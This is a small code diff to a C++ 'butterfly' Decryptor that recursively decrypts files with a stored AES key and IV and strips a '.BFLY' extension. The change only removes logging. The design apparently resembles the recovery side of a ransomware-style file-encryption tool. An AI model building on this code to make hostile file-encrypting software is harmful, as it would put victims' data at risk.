@@ -41,12 +41,9 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
     std::string aesk, aesiv;
     decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESIV_FILENAME, aesk, aesiv);
 
-    //LOG_TRACE("Length of AESKEY in decrypt: " << aesk.length() << " and length of AESIV in decrypt: " << aesiv.length());
-
     auto files = DirectoryIterator::getAllFiles(dirPath);
     for (auto &file: files)
     {
-        LOG_TRACE("FILE: " << file);
         std::string filepath = file.string();
         removeBFLYEnding(filepath);
         decryptFileWithAES(filepath, aesk, aesiv);
